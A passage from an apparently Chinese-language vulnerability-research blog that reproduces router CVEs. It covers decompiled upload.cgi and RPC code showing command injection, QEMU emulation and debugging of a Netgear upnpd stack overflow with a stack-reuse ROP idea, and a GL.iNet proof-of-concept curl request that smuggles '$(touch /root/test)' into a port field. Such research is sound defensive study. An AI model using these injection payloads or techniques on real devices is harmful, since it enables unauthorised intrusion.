Request&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这时候仔细分析upload.cgi</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( !parsedFilePathBuffer )</span><br><span class="line"> &#123;</span><br><span class="line">   puts(&quot;Content-type: text/html\n&quot;);</span><br><span class="line">   printf(&quot;Error Input&quot;);</span><br><span class="line">   goto LABEL_36;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这个地方得跳过，因此file.path需存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_115D0(const char *a1, const char *a2, const char *a3)</span><br><span class="line">&#123;</span><br><span class="line">  bool v3; // zf</span><br><span class="line">  const char *v8; // r4</span><br><span class="line">  int v9; // r4</span><br><span class="line">  char s[316]; // [sp+Ch] [bp-13Ch] BYREF</span><br><span class="line"></span><br><span class="line">  v3 = a3 == 0;</span><br><span class="line">  if ( a3 )</span><br><span class="line">    v3 = a1 == 0;</span><br><span class="line">  if ( v3 )</span><br><span class="line">    return -1;</span><br><span class="line">  if ( !strcmp(a1, &quot;Firmware&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = &quot;/tmp/firmware&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( !strcmp(a1, &quot;Configuration&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = &quot;/tmp/configuration&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( !strcmp(a1, &quot;Certificate&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = &quot;/tmp/in_certs&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( !strcmp(a1, &quot;Signature&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = &quot;/tmp/signature&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( !strcmp(a1, &quot;3g-4g-driver&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = &quot;/tmp/3g-4g-driver&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( !strcmp(a1, &quot;Language-pack&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = &quot;/tmp/language-pack&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( !strcmp(a1, &quot;User&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = &quot;/tmp/user&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    if ( strcmp(a1, &quot;Portal&quot;) )</span><br><span class="line">      return -1;</span><br><span class="line">    v8 = &quot;/tmp/www&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( !is_file_exist(a2) )</span><br><span class="line">    return -2;</span><br><span class="line">  if ( strlen(a2) &gt; 0x80 || strlen(a3) &gt; 0x80 )</span><br><span class="line">    return -3;</span><br><span class="line">  if ( match_regex((int)&quot;^[a-zA-Z0-9_.-]*$&quot;, (int)a3) )</span><br><span class="line">    return -4;</span><br><span class="line">  sprintf(s, &quot;mv -f %s %s/%s&quot;, a2, v8, a3);</span><br><span class="line">  debug(&quot;cmd=%s&quot;, s);</span><br><span class="line">  if ( !s[0] )</span><br><span class="line">    return -1;</span><br><span class="line">  v9 = system(s);</span><br><span class="line">  if ( v9 &lt; 0 )</span><br><span class="line">    error((int)&quot;upload.cgi: %s(%d) Upload failed!&quot;, (int)&quot;prepare_file&quot;, (const char *)0xB3);</span><br><span class="line">  return v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个是上传文件的逻辑，因此a1和a3也得存在，即pathparam和fileparam</p><h2 id="CVE-2022-20707"><a href="#CVE-2022-20707" class="headerlink" title="CVE-2022-20707"></a>CVE-2022-20707</h2><p>一些函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall json_object_object_add(int a1, const char *a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v6; // r0</span><br><span class="line">  int v7; // r4</span><br><span class="line">  int v8; // r4</span><br><span class="line">  char *v9; // r0</span><br><span class="line">  int result; // r0</span><br><span class="line"></span><br><span class="line">  v6 = j_lh_table_lookup_entry(*(_DWORD *)(a1 + 24));</span><br><span class="line">  v7 = v6;</span><br><span class="line">  if ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_DWORD *)(v6 + 4);</span><br><span class="line">    if ( result )</span><br><span class="line">      result = j_json_object_put();</span><br><span class="line">    *(_DWORD *)(v7 + 4) = a3;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = *(_DWORD *)(a1 + 24);</span><br><span class="line">    v9 = strdup(a2);</span><br><span class="line">    return j_lh_table_insert(v8, (int)v9, a3);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这段代码是一个用于向 JSON 对象中添加键值对的函数。它使用了一个哈希表来存储对象的键值对。以下是对代码的详细分析：</p><p><strong>参数</strong>：</p><ul><li><code>a1</code>：表示 JSON 对象的指针。</li><li><code>a2</code>：表示要添加的键。</li><li><code>a3</code>：表示要添加的值。</li></ul></blockquote><p>在sub_12684中，如果传入的文件类型是Firmware：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_117E0(int destination, int fileparam, int uploadOption)</span><br><span class="line">&#123;</span><br><span class="line">  bool isZeroFlag; // zf</span><br><span class="line">  int jsonObjRpc; // r5</span><br><span class="line">  int jsonObjParams; // r4</span><br><span class="line">  int jsonObjInput; // r7</span><br><span class="line">  int jsonObjSource; // r10</span><br><span class="line">  int jsonObjDestination; // r8</span><br><span class="line">  int jsonStrRpcVersion; // r0</span><br><span class="line">  int jsonStrMethod; // r0</span><br><span class="line">  int jsonStrRpcAction; // r0</span><br><span class="line">  int jsonStrFileType; // r0</span><br><span class="line">  int locationUrlStr; // r0</span><br><span class="line">  int jsonStrLocationUrl; // r0</span><br><span class="line">  int jsonStrFirmwareState; // r0</span><br><span class="line">  int jsonStrRebootType; // r0</span><br><span class="line">  int jsonObjFirmwareOption; // [sp+4h] [bp-34h]</span><br><span class="line">  int strBuf; // [sp+Ch] [bp-2Ch] BYREF</span><br><span class="line"></span><br><span class="line">  isZeroFlag = fileparam == 0;</span><br><span class="line">  if ( fileparam )</span><br><span class="line">    isZeroFlag = destination == 0;</span><br><span class="line">  if ( isZeroFlag )</span><br><span class="line">    return 0;</span><br><span class="line">  if ( !uploadOption )</span><br><span class="line">    return 0;</span><br><span class="line">  jsonObjRpc = json_object_new_object();</span><br><span class="line">  jsonObjParams = json_object_new_object();</span><br><span class="line">  jsonObjInput = json_object_new_object();</span><br><span class="line">  jsonObjSource = json_object_new_object();</span><br><span class="line">  jsonObjDestination = json_object_new_object();</span><br><span class="line">  jsonObjFirmwareOption = json_object_new_object();</span><br><span class="line">  strBuf = StrBufCreate();</span><br><span class="line">  StrBufSetStr(strBuf, &quot;FILE://Firmware/&quot;);</span><br><span class="line">  StrBufAppendStr(strBuf, fileparam);</span><br><span class="line">  jsonStrRpcVersion = json_object_new_string(&quot;2.0&quot;);</span><br><span class="line">  json_object_object_add(jsonObjRpc, (int)&quot;jsonrpc&quot;, jsonStrRpcVersion);</span><br><span class="line">  jsonStrMethod = json_object_new_string(&quot;action&quot;);</span><br><span class="line">  json_object_object_add(jsonObjRpc, (int)&quot;method&quot;, jsonStrMethod);</span><br><span class="line">  json_object_object_add(jsonObjRpc, (int)&quot;params&quot;, jsonObjInput);</span><br><span class="line">  jsonStrRpcAction = json_object_new_string(&quot;file-copy&quot;);</span><br><span class="line">  json_object_object_add(jsonObjInput, (int)&quot;rpc&quot;, jsonStrRpcAction);</span><br><span class="line">  json_object_object_add(jsonObjInput, (int)&quot;input&quot;, jsonObjParams);</span><br><span class="line">  jsonStrFileType = json_object_new_string(&quot;firmware&quot;);</span><br><span class="line">  json_object_object_add(jsonObjParams, (int)&quot;fileType&quot;, jsonStrFileType);</span><br><span class="line">  json_object_object_add(jsonObjParams, (int)&quot;source&quot;, jsonObjSource);</span><br><span class="line">  locationUrlStr = StrBufToStr(strBuf);</span><br><span class="line">  jsonStrLocationUrl = json_object_new_string(locationUrlStr);</span><br><span class="line">  json_object_object_add(jsonObjSource, (int)&quot;location-url&quot;, jsonStrLocationUrl);</span><br><span class="line">  json_object_object_add(jsonObjParams, (int)&quot;destination&quot;, jsonObjDestination);</span><br><span class="line">  jsonStrFirmwareState = json_object_new_string(destination);</span><br><span class="line">  json_object_object_add(jsonObjDestination, (int)&quot;firmware-state&quot;, jsonStrFirmwareState);</span><br><span class="line">  json_object_object_add(jsonObjParams, (int)&quot;firmware-option&quot;, jsonObjFirmwareOption);</span><br><span class="line">  jsonStrRebootType = json_object_new_string(uploadOption);</span><br><span class="line">  json_object_object_add(jsonObjFirmwareOption, (int)&quot;reboot-type&quot;, jsonStrRebootType);</span><br><span class="line">  StrBufFree(&amp;strBuf);</span><br><span class="line">  return jsonObjRpc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单分析得出jsonObjRpc是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">  &quot;method&quot;: &quot;action&quot;,</span><br><span class="line">  &quot;params&quot;: &#123;</span><br><span class="line">    &quot;rpc&quot;: &quot;file-copy&quot;,</span><br><span class="line">    &quot;input&quot;: &#123;</span><br><span class="line">      &quot;fileType&quot;: &quot;firmware&quot;,</span><br><span class="line">      &quot;source&quot;: &#123;</span><br><span class="line">        &quot;location-url&quot;: &quot;FILE://Firmware/[fileparam]&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;destination&quot;: &#123;</span><br><span class="line">        &quot;firmware-state&quot;: &quot;[destination]&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;firmware-option&quot;: &#123;</span><br><span class="line">        &quot;reboot-type&quot;: &quot;[uploadOption]&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后接下来是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">json_object = operation_result;</span><br><span class="line">if ( !operation_result )</span><br><span class="line">    goto LABEL_19;</span><br><span class="line">json_string = (const char *)json_object_to_json_string(operation_result);</span><br><span class="line">sprintf(</span><br><span class="line">    curl_command_buffer,</span><br><span class="line">    &quot;curl %s --cookie &#x27;sessionid=%s&#x27; -X POST -H &#x27;Content-Type: application/json&#x27; -d &#x27;%s&#x27;&quot;,</span><br><span class="line">    url,</span><br><span class="line">    session_id,</span><br><span class="line">    json_string);</span><br><span class="line">curl_output_file = popen(curl_command_buffer, &quot;r&quot;);</span><br></pre></td></tr></table></figure><p>可以看到json_string是通过operation_result得到的，而opration_result就是上述的json结果，而json部分字符串是可控的，因此显然可以进行命令的注入</p><h2 id="CVE-2022-20700（会话伪造）"><a href="#CVE-2022-20700（会话伪造）" class="headerlink" title="CVE-2022-20700（会话伪造）"></a>CVE-2022-20700（会话伪造）</h2><p>通过上述命令执行的漏洞，创建&#x2F;tmp&#x2F;websession&#x2F;下的文本文件（虽然到了最后，环境还是没有成功依靠自己启起来，但是我用了cyberangel师傅之前启用的debian，也是成功啦！！！！！太ql）</p><h2 id="PSV-2020-0211（栈溢出利用RCE）"><a href="#PSV-2020-0211（栈溢出利用RCE）" class="headerlink" title="PSV-2020-0211（栈溢出利用RCE）"></a>PSV-2020-0211（栈溢出利用RCE）</h2><p>netgear R8300 1.0.2.130 的upnp中存在栈溢出的漏洞，主要学习<strong>利用手法</strong>，NVram hook手法，Poc编写 以及 调试技巧</p><ul><li>**UPnP (Universal Plug and Play)**：现在由开放连接基金会管理的是一套网络协议，它允许网络设备无缝地发现彼此在网络上的存在，并为数据共享、通信和娱乐建立功能网络服务。</li></ul><p>UPnP会将某个端口连接到<strong>多播组</strong>，即允许接收其他客户端传输数据（一对多）【或许就是通过这个来使得网络设备可以无缝发现彼此扒】</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202504062349439.png" alt="image-20250228222327229"></p><p>漏洞看着是很简单的，但是由于sub_25E04是通过strcpy来栈溢出的，因此\x00截断便是不可绕过的障碍，而原作者的利用手法值得学习</p><p>启动服务：这次使用用户模式运行</p><p>因为涉及到nvram，使用LD_PRELOAD Hook技术，网上有人已经写好了针对netgear R6250&#x2F;6400的nvram hook，对于R8300也是适用的 <a href="https://github.com/therealsaumil/custom_nvram/blob/master/custom_nvram_r6250.c">https://github.com/therealsaumil/custom_nvram/blob/master/custom_nvram_r6250.c</a></p><p>使用buildroot进行交叉编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd ~/buildroot-2024.11/output/host/bin </span><br><span class="line">export PATH=$PATH:$(pwd)</span><br><span class="line">arm-linux-gcc -c -O2 -fPIC -Wall ./nvram1.c -o ./nvram1.o</span><br><span class="line">arm-linux-gcc -shared -nostdlib  ./nvram1.o -o ./nvram1.so</span><br></pre></td></tr></table></figure><p>之后创建&#x2F;tmp&#x2F;nvram.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">upnpd_debug_level=9</span><br><span class="line">lan_ipaddr=192.168.122.167</span><br><span class="line">hwver=R8500</span><br><span class="line">friendly_name=R8300</span><br><span class="line">upnp_enable=1</span><br><span class="line">upnp_turn_on=1</span><br><span class="line">upnp_advert_period=30</span><br><span class="line">upnp_advert_ttl=4</span><br><span class="line">upnp_portmap_entry=1</span><br><span class="line">upnp_duration=3600</span><br><span class="line">upnp_DHCPServerConfigurable=1</span><br><span class="line">wps_is_upnp=0</span><br><span class="line">upnp_sa_uuid=00000000000000000000</span><br><span class="line">lan_hwaddr=AA:BB:CC:DD:EE:FF</span><br></pre></td></tr></table></figure><p>之后的lan_ipaddr还要连接，因此要把ip起起来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ip addr add 192.168.122.167/24 dev virbr0</span><br><span class="line">ip addr show virbr0</span><br></pre></td></tr></table></figure><p>显示对应的ip就代表成功啦</p><p>之后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-arm-static -E LD_PRELOAD=&quot;./nvram1.so ./lib/libdl.so.0&quot; ./usr/sbin/upnpd</span><br><span class="line">sudo lsof -i | grep qemu                                                                     </span><br><span class="line">qemu-arm- 6267            root    3u  IPv4  93141      0t0  UDP *:1900 </span><br><span class="line">qemu-arm- 6267            root    4u  IPv4  93142      0t0  UDP *:45791 </span><br><span class="line">qemu-arm- 6267            root    5u  IPv4  93143      0t0  TCP *:5000 (LISTEN)</span><br></pre></td></tr></table></figure><p>如此程序就起起来了，就可以开始Poc的编写了</p><p>调试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-arm-static -g 1234 -E LD_PRELOAD=&quot;./nvram1.so ./lib/libdl.so.0&quot; ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure><blockquote><p>一开始傻呗了，忘记了用户模式可以直接调试，直接attach pid调试调的是qemu的进程（）</p></blockquote><p>main函数中有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( daemon(1, 1) == -1 )</span><br><span class="line">&#123;</span><br><span class="line">  debug(3, &quot;Fail to run as daemon&quot;);</span><br><span class="line">  v13 = _errno_location();</span><br><span class="line">  exit(*v13);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>daemon使得当前进程会变成守护进程并保持工作目录不变，但是这个会让该进程脱离gdb的控制，考虑nop掉，成功~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> R0   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R1   0xfffed504 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R2   0xfffed504 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R3   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R4   0x61</span><br><span class="line"> R5   0xfffed500 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R6   0xfffed504 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R7   0xfffed500 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R8   0xfffed504 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R9   0x10ab</span><br><span class="line"> R10  0x1</span><br><span class="line"> R11  0xc4584 ◂— 7</span><br><span class="line"> R12  0x553dc —▸ 0xff60393c ◂— push &#123;r4, lr&#125; /* 0xe92d4010 */</span><br><span class="line"> SP   0xfffeceb8 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> PC   0xff603954 ◂— ldrb ip, [r3] /* 0xe5d3c000 */</span><br><span class="line">──────────────────────────────────────────────────────────[ DISASM / arm / set emulate on ]──────────────────────────────────────────────────────────</span><br><span class="line">   0xff603948    ldrb   r4, [r2]</span><br><span class="line">   0xff60394c    cmp    r4, #0</span><br><span class="line">   0xff603950    popeq  &#123;r4, pc&#125;</span><br><span class="line"> ► 0xff603954    ldrb   ip, [r3]</span><br><span class="line">   0xff603958    cmp    r4, ip</span><br><span class="line">   0xff60395c    addeq  r2, r2, #1</span><br><span class="line">   0xff603960    addeq  r3, r3, #1</span><br><span class="line">   0xff603964    beq    #0xff603948                   &lt;0xff603948&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xff603948    ldrb   r4, [r2]</span><br><span class="line">   0xff60394c    cmp    r4, #0</span><br><span class="line">   0xff603950    popeq  &#123;r4, pc&#125;</span><br><span class="line">──────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ sp 0xfffeceb8 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">01:0004│    0xfffecebc —▸ 0xb62c ◂— subs r7, r0, #0 /* 0xe2507000 */</span><br><span class="line">02:0008│    0xfffecec0 —▸ 0xfffedefd ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">03:000c│    0xfffecec4 —▸ 0xfffed574 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">04:0010│    0xfffecec8 —▸ 0x8df9 ◂— 0xad</span><br><span class="line">05:0014│    0xfffececc —▸ 0xfffef5f4 ◂— mrchs p9, #1, r3, c2, c1, #1 /* 0x2e323931; &#x27;192.168.122.1&#x27; */</span><br><span class="line">06:0018│    0xfffeced0 —▸ 0xfffed500 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">07:001c│    0xfffeced4 —▸ 0x25e80 ◂— subs sl, r0, #0 /* 0xe250a000 */</span><br><span class="line">────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 0xff603954</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>发送大量数据就成功发现栈溢出漏洞</p><p>漏洞利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">frimware/_R8300-V1.0.2.130_1.0.99.chk.extracted/squashfs-root </span><br><span class="line">&gt; checksec ./usr/sbin/upnpd     </span><br><span class="line">[*] &#x27;/home/s1nec-1o/frimware/_R8300-V1.0.2.130_1.0.99.chk.extracted/squashfs-root/usr/sbin/upnpd&#x27;</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br></pre></td></tr></table></figure><p>没pie，就启用了nx</p><p><code>SSD</code> 公开的<a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/">漏洞细节</a>中给出了一个方案：通过 <code>stack reuse</code> 的方式来绕过该限制。具体思路为，先通过 <code>socket</code> 发送第一次数据，往栈上填充相应的 <code>rop payload</code>，同时保证不会造成程序崩溃；再通过 <code>socket</code> 发送第二次数据用于覆盖栈上的返回地址，填充的返回地址用来实现 <code>stack pivot</code>，即劫持栈指针使其指向第一次发送的 <code>payload</code> 处，然后再复用之前的 <code>payload</code> 以完成漏洞利用。<code>SSD</code> 公开的漏洞细节中的示意图如下。</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202504062349440.png" alt="image-20250301114232391"></p><p>这里借用的ROP有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:000230F0                 ADD             SP, SP, #0x20C</span><br><span class="line">.text:000230F4                 ADD             SP, SP, #0x1000</span><br><span class="line">.text:000230F8                 POP             &#123;R4-R11,PC&#125;</span><br></pre></td></tr></table></figure><p>升栈并且pop出所有关键寄存器，如此只需要提前构造好对应的payload就可以进行ROP啦！</p><p>但是我在构造的时候总是发现它会失败，就算是运行的是发布者写的poc（）总是断在一些奇怪的地方，研究许久后放弃，了解利用手法即可，<strong>reuse stack！</strong></p><h2 id="CVE-2024-39226"><a href="#CVE-2024-39226" class="headerlink" title="CVE-2024-39226"></a>CVE-2024-39226</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &#x27;glinet: 1&#x27; 127.0.0.1/rpc -d &#x27;&#123;&quot;method&quot;:&quot;call&quot;, &quot;params&quot;:[&quot;&quot;, &quot;s2s&quot;, &quot;enable_echo_server&quot;, &#123;&quot;port&quot;: &quot;7 $(touch /root/test)&quot;&#125;]&#125;&#x27;</span><br></pre></td></tr></table></figure><p>这是Poc，发现通过本地&#x2F;rpc访问，因此看&#x2F;rpc的api</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location = /rpc &#123;</span><br><span class="line">    content_by_lua_file /usr/share/gl-ngx/oui-rpc.lua;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过&#x2F;usr&#x2F;share&#x2F;gl-ngx&#x2F;oui-rpc.lua;文件处理</p><p>定义了多种方法，Poc中使用call方法给出params变量（oui-rpc.lua定义了很多的方法，通过参数method传入）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 